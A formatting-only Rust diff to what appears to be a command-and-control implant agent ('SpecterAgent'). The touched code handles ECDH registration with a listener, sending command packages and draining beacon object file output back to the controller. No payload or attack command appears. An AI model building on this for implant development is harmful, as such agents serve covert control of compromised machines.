@@ -15,7 +15,9 @@ use crate::coffeeldr::{self, BofOutputQueue};
 use crate::config::SpecterConfig;
 use crate::dispatch::{self, DispatchResult, MemFileStore, PsScriptStore, Response};
 use crate::download::DownloadTracker;
-use crate::ecdh::{EcdhSession, decode_listener_pub_key, perform_registration, send_session_packet};
+use crate::ecdh::{
+    EcdhSession, decode_listener_pub_key, perform_registration, send_session_packet,
+};
 use crate::error::SpecterError;
 use crate::job::JobStore;
 use crate::pivot::PivotState;
@@ -576,10 +578,7 @@ impl SpecterAgent {
                 .await
                 .map_err(|e| SpecterError::Transport(format!("ECDH registration: {e}")))?;
 
-        info!(
-            agent_id = format_args!("0x{:08X}", session.agent_id),
-            "ECDH registration complete"
-        );
+        info!(agent_id = format_args!("0x{:08X}", session.agent_id), "ECDH registration complete");
 
         self.agent_id = session.agent_id;
         self.ecdh_session = Some(session);
@@ -623,11 +622,7 @@ impl SpecterAgent {
         request_id: u32,
         payload: &[u8],
     ) -> Result<(), SpecterError> {
-        let pkg = DemonPackage {
-            command_id,
-            request_id,
-            payload: payload.to_vec(),
-        };
+        let pkg = DemonPackage { command_id, request_id, payload: payload.to_vec() };
         let _resp = self.ecdh_send_packages(vec![pkg]).await?;
         Ok(())
     }
@@ -692,9 +687,9 @@ impl SpecterAgent {
             // Drain BOF callbacks.
             let bof_responses = self.drain_bof_output();
             for resp in bof_responses {
-                if let Err(e) =
-                    self.ecdh_send_raw_callback(resp.command_id, resp.request_id, &resp.payload)
-                        .await
+                if let Err(e) = self
+                    .ecdh_send_raw_callback(resp.command_id, resp.request_id, &resp.payload)
+                    .await
                 {
                     warn!(error = %e, "ecdh: failed to send BOF callback");
                 }
